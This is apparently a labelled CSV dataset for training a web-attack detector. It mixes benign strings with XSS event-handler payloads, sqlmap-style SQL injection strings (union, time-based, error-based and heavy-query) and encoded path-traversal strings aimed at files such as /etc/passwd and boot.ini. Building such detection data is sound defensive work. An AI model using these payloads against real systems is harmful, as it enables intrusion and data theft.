"payload","label"
"<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>","XSS"
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--","SQLi"
"%c0%fe%c0%fe%c1%1c%c0%fe%c0%fe%c1%1c%c0%fe%c0%fe%c1%1c%c0%fe%c0%fe%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"-6397%' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = '","SQLi"
"SELECT AVG ( complex ) FROM engine SELECT SUM ( clock )","Normal"
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'xgzb' = 'xgzb","SQLi"
"<time draggable=""true"" ondragend=""alert(1)"">test</time>","XSS"
"<hgroup onbeforecopy=""alert(1)"" contenteditable>test</hgroup>","XSS"
"-7715' )  union all select 4830,4830,4830,4830,4830,4830,4830,4830--","SQLi"
"%f0%80%80%ae%f0%80%80%ae%u2215%f0%80%80%ae%f0%80%80%ae%u2215%f0%80%80%ae%f0%80%80%ae%u2215%f0%80%80%ae%f0%80%80%ae%u2215%f0%80%80%ae%f0%80%80%ae%u2215%f0%80%80%ae%f0%80%80%ae%u2215boot.ini","Suspicious"
"-3368'  )  )   union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--","SQLi"
"<svg><ul onload=alert(1)></ul>","XSS"
"%c0%ae%c0%ae%f8%80%80%80%af%c0%ae%c0%ae%f8%80%80%80%af%c0%ae%c0%ae%f8%80%80%80%af%c0%ae%c0%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>","XSS"
"1 )  where 4479 = 4479 rlike  ( select  ( case when  ( 6351 = 4367 )  then 1 else 0x28 end  )  )  --","SQLi"
"1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'","SQLi"
"%uff0e%uff0e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
"SELECT * FROM they ORDER BY ask ASC, mine DESC","Normal"
"SELECT * FROM continued ORDER BY zipper ASC, swam DESC","Normal"
"1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SQLi"
"%c0.%c0.%%32%%66%c0.%c0.%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts","Suspicious"
"reason@cajucar.br","Normal"
"%252e%252e%c0%9v%252e%252e%c0%9vetc%c0%9vpasswd","Suspicious"
"..%c1%af..%c1%af..%c1%af..%c1%af..%c1%afetc%c1%afpasswd","Suspicious"
"25g0a00","Normal"
"SELECT * FROM could WHERE corner NOT BETWEEN 'certainly' AND 'oxygen'","Normal"
"%c0.%c0.%c0%af%c0.%c0.%c0%afetc%c0%afpasswd","Suspicious"
"renick@piaceredelivery.hn","Normal"
"1 )  union all select null,null,null,null,null--","SQLi"
"1' )  as nftr where 8825 = 8825 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #","SQLi"
"<article onkeyup=""alert(1)"" contenteditable>test</article>","XSS"
"1%""   )    )    union all select null,null--","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x2f%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x2fetc0x2fissue","Suspicious"
"SELECT * FROM  ( SELECT dull FROM wire )","Normal"
"SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm'","Normal"
"%5C..%252f%5C..%252f%5C..%252fboot.ini","Suspicious"
"<svg><hr onload=alert(1)></hr>","XSS"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>","XSS"
"%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd","Suspicious"
"1%"" and 1343 = 5939#","SQLi"
"<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>","XSS"
"-7444  )  )   )  or 1342 = 9774","SQLi"
"nrez muriscot","Normal"
"-9178'  )   or 9779  =  6351","SQLi"
"SELECT MIN ( right )  AS different FROM factor","Normal"
"C:/windows/panther/sysprep.inf","Suspicious"
"0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"-2722"" )  or 4907 = 8126#","SQLi"
"-5082  )  )   union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>","XSS"
"1%""  )   and 9198  =  9198--","SQLi"
"..%01%c1%af..%01%c1%af..%01%c1%afetc%c1%afpasswd","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%u2215%f8%80%80%80%ae%f8%80%80%80%ae%u2215%f8%80%80%80%ae%f8%80%80%80%ae%u2215%f8%80%80%80%ae%f8%80%80%80%ae%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts","Suspicious"
"herrera de los navarros","Normal"
"<section oncontextmenu=""alert(1)"">test</section>","XSS"
"1 )  as qort where 1554 = 1554","SQLi"
"%2e.%uF025%2e.%uF025%2e.%uF025boot.ini","Suspicious"
"<input onpaste=alert(1) value="""" autofocus>","XSS"
"matizar","Normal"
"<label onpaste=""alert(1)"" contenteditable>test</label>","XSS"
"0x2e0x2e%uF0250x2e0x2e%uF0250x2e0x2e%uF0250x2e0x2e%uF025boot.ini","Suspicious"
"1' and 7533  =  7533 and 'clqy' like 'clqy","SQLi"
"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --","SQLi"
"/proc/meminfo","Suspicious"
".%00./etc/issue","Suspicious"
"7512210000000000","Normal"
"%c0%ae%c0%ae%c0%9v%c0%ae%c0%ae%c0%9v%c0%ae%c0%ae%c0%9v%c0%ae%c0%ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts","Suspicious"
"..../%c0%2f..../%c0%2f..../%c0%2f..../%c0%2f..../%c0%2fetc%c0%2fissue","Suspicious"
".?%c1%1c.?%c1%1c.?%c1%1c.?%c1%1c.?%c1%1c.?%c1%1cboot.ini","Suspicious"
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'xhez' like 'xhez","SQLi"
"SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31'","Normal"
"<rb onpointerout=alert(1)>XSS</rb>","XSS"
"..\\\..\\\..\\\..\\\etc\\\issue","Suspicious"
"..//..//..//..//..//etc//issue","Suspicious"
"C:/windows/panther/unattend/sysprep.inf","Suspicious"
"<dt onclick=""alert(1)"">test</dt>","XSS"
".?%c0%2f.?%c0%2f.?%c0%2fboot.ini","Suspicious"
"..%c0%qf..%c0%qfetc%c0%qfissue","Suspicious"
"7659332695027336","Normal"
"-5291'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'tmpm' = 'tmpm","SQLi"
"c/ font flavia, 14, 6c","Normal"
"radunsky_oses@guejosgratis.cg","Normal"
"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#","SQLi"
"??\??\??\??\??\windows\system32\drivers\etc\hosts","Suspicious"
"<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>","XSS"
".%00.%c1%9c.%00.%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"1' in boolean mode  )   union all select null,null,null,null,null,null#","SQLi"
"..%01%c1%pcboot.ini","Suspicious"
"despuig","Normal"
"?.%c0%5cetc%c0%5cpasswd","Suspicious"
"SELECT AVG ( due ) FROM guide SELECT SUM ( police )","Normal"
"1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --","SQLi"
"1%' and make_set ( 8403 = 8403,8899 )  and '%' = '","SQLi"
"SELECT Employees.mistake, COUNT ( Orders.worseID )  AS oughtFROM    ( OrdersINNER JOIN storm ON Orders.diameterID  =  Employees.bothID )","Normal"
"1 )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )","SQLi"
"SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )","Normal"
"sureda fuertes","Normal"
"%c0%fe%c0%fe%uEFC8boot.ini","Suspicious"
"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'","SQLi"
"%c0%ae%c0%ae%255c%c0%ae%c0%ae%255c%c0%ae%c0%ae%255cetc%255cissue","Suspicious"
"1"" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --","SQLi"
"%f0%80%80%ae%f0%80%80%ae0x5c%f0%80%80%ae%f0%80%80%ae0x5c%f0%80%80%ae%f0%80%80%ae0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"villaverde de scar","Normal"
"( select  ( case when  ( 5603 = 5603 )  then 5603 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual )","SQLi"
"%252e%252e%f8%80%80%80%af%252e%252e%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"62381470l","Normal"
"SELECT * FROM suppose WHERE threw IN  ( 'student', 'rope', 'means' )","Normal"
"639488000000000","Normal"
"?.%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts","Suspicious"
"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"lttecke","Normal"
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""utzr"" like ""utzr","SQLi"
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw","SQLi"
"SELECT * FROM low WHERE thee NOT BETWEEN 'enjoy' AND 'factor'","Normal"
"%2e.%u2216etc%u2216issue","Suspicious"
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy","SQLi"
"roco del cielo","Normal"
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc","SQLi"
"%2e.%c0%af%2e.%c0%af%2e.%c0%af%2e.%c0%af%2e.%c0%af%2e.%c0%afetc%c0%afpasswd","Suspicious"
"-4256' )  where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --","SQLi"
"1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#","SQLi"
"<embed draggable=""true"" ondrag=""alert(1)"">test</embed>","XSS"
"SELECT * FROM  ( SELECT greatest FROM pink )","Normal"
"1"" )  as zopq where 2680 = 2680","SQLi"
"fincias alcoriza","Normal"
"<div draggable=""true"" ondragenter=""alert(1)"">test</div>","XSS"
"debicki@prestoesesto.hr","Normal"
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl","SQLi"
"..%01%%32%%66etc%%32%%66issue","Suspicious"
"%c0%ae%c0%ae%e0%80%afetc%e0%80%afpasswd","Suspicious"
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>","Normal"
"SELECT MIN ( mud )  AS parallel FROM around","Normal"
"</p><p>For the danger of uncontrolled advanced AI to be realized, the hypothetical AI would have to overpower or out-think all of humanity, which a minority of experts argue is a possibility far enough in the future to not be worth researching.<sup id=""cite_ref-377"" class=""reference""><a href=""#cite_note-377"">&#91;366&#93; </a> </sup><sup id=""cite_ref-378"" class=""reference""><a href=""#cite_note-378"">&#91;367&#93; </a> </sup> Other counterarguments revolve around humans being either intrinsically or convergently valuable from the perspective of an artificial intelligence.<sup id=""cite_ref-379"" class=""reference""><a href=""#cite_note-379"">&#91;368&#93; </a> </sup>","Normal"
"roehn.kernke@eldeseodepecar.ec","Normal"
"-3767' )  as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#","SQLi"
"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=image-net.org&amp;rft.atitle=ILSVRC2017&amp;rft_id=http%3A%2F%2Fimage-net.org%2Fchallenges%2FLSVRC%2F2017%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">","Normal"
"..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5cetc0x5cissue","Suspicious"
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""tbcc"" = ""tbcc","SQLi"
"%5C..\etc\issue","Suspicious"
"gullera","Normal"
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""uydm"" = ""uydm","SQLi"
"??%bg%qf??%bg%qf??%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"1' and 2908 = 8067--","SQLi"
"bassagaa gifra","Normal"
"/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf","Suspicious"
"In Town Parliament , Röhrenbeck asked whether Town Council planning discussions postal service regarding matter","Normal"
"UPDATE cost SET cat = 'discuss'WHERE today = 'dig'","Normal"
"8271","Normal"
"??%bg%qf??%bg%qf??%bg%qfboot.ini","Suspicious"
"1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'ohqs' like 'ohqs","SQLi"
"-8902 union all select 4339,4339,4339#","SQLi"
"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  ""","SQLi"
"mcginnis-dellagnese@storagecraft.na","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8s%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8s%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8s%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8s%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8s%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%8setc%c1%8sissue","Suspicious"
"SELECT Employees.tape, COUNT ( Orders.vegetableID )  AS weekFROM    ( OrdersINNER JOIN volume ON Orders.effectID  =  Employees.numberID )","Normal"
"eward","Normal"
"SELECT AVG ( ate ) FROM wrapped SELECT SUM ( real )","Normal"
"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1","SQLi"
"<rt onpointerover=alert(1)>XSS</rt>","XSS"
"%%c0%6e%c0%6e%25c1%259c%%c0%6e%c0%6e%25c1%259c%%c0%6e%c0%6e%25c1%259c%%c0%6e%c0%6e%25c1%259c%%c0%6e%c0%6e%25c1%259cetc%25c1%259cpasswd","Suspicious"
"?.%5c?.%5c?.%5c?.%5c?.%5c?.%5cetc%5cpasswd","Suspicious"
"masclans nieto","Normal"
"conceptualismo","Normal"
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","SQLi"
"<rb onmouseout=""alert(1)"">test</rb>","XSS"
"1' and make_set  (  4952  =  7129,7129  )","SQLi"
"SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel )","Normal"
"<dd onpointerup=alert(1)>XSS</dd>","XSS"
"%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd","Suspicious"
"<basefont id=x tabindex=1 onactivate=alert(1)></basefont>","XSS"
"1' )  as zxos where 2745 = 2745","SQLi"
"..%010x5c..%010x5c..%010x5cetc0x5cissue","Suspicious"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%bg%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%bg%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%bg%qfetc%bg%qfpasswd","Suspicious"
"%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qfboot.ini","Suspicious"
"SELECT reader","Normal"
"SELECT city ( s )  FROM secret","Normal"
"-9315'  )  )   )  union all select 5057,5057,5057,5057,5057#","SQLi"
"<form oncontextmenu=""alert(1)"">test</form>","XSS"
"<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>","XSS"
"verge","Normal"
"%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/%%32%%65%%32%%65/boot.ini","Suspicious"
"iif ( 5462 = 8866,1,1/0 )","SQLi"
"%c0.%c0.%%35%%63%c0.%c0.%%35%%63%c0.%c0.%%35%%63%c0.%c0.%%35%%63%c0.%c0.%%35%%63%c0.%c0.%%35%%63etc%%35%%63passwd","Suspicious"
"' or 'something'  =  'some'+'thing'","SQLi"
"SELECT * FROM independent WHERE below BETWEEN 'go' AND 'visitor'","Normal"
"-8453  )  )   )  or 3038 = 3038","SQLi"
"<blockquote onpointerout=alert(1)>XSS</blockquote>","XSS"
"I ashamed think easily capitulate badges names, large societies dead institutions","Normal"
"%c0.%c0.0x2f%c0.%c0.0x2f%c0.%c0.0x2f%c0.%c0.0x2f%c0.%c0.0x2fetc0x2fpasswd","Suspicious"
"1' union all select null#","SQLi"
"<data onpointerdown=alert(1)>XSS</data>","XSS"
"1440000000000000","Normal"
"1'   )    )     )   union all select null,null--","SQLi"
"%c0%ee%c0%ee%c1%1c%c0%ee%c0%ee%c1%1c%c0%ee%c0%ee%c1%1c%c0%ee%c0%ee%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"SELECT business FROM word UNION ALL SELECT desk FROM exactly ORDER BY fear","Normal"
"?.0x5cetc0x5cpasswd","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%c0%qf%f8%80%80%80%ae%f8%80%80%80%ae%c0%qf%f8%80%80%80%ae%f8%80%80%80%ae%c0%qf%f8%80%80%80%ae%f8%80%80%80%ae%c0%qf%f8%80%80%80%ae%f8%80%80%80%ae%c0%qfetc%c0%qfissue","Suspicious"
"<IMG STYLE="":expr/**/ession(alert(''))"">","XSS"
"..%01/..%01/..%01/..%01/etc/issue","Suspicious"
"1' )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #","SQLi"
"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484","SQLi"
"08191","Normal"
"select  ( case when  ( 4205 = 9574 )  then 4205 else 1/ ( select 0 )  end ) --","SQLi"
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wynp","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>","XSS"
"1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt","SQLi"
"22167302v","Normal"
"SELECT * FROM composition ORDER BY enough","Normal"
"SELECT * FROM  ( SELECT station FROM flew )","Normal"
"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SQLi"
"1'   )    )    as qaki where 5272  =  5272","SQLi"
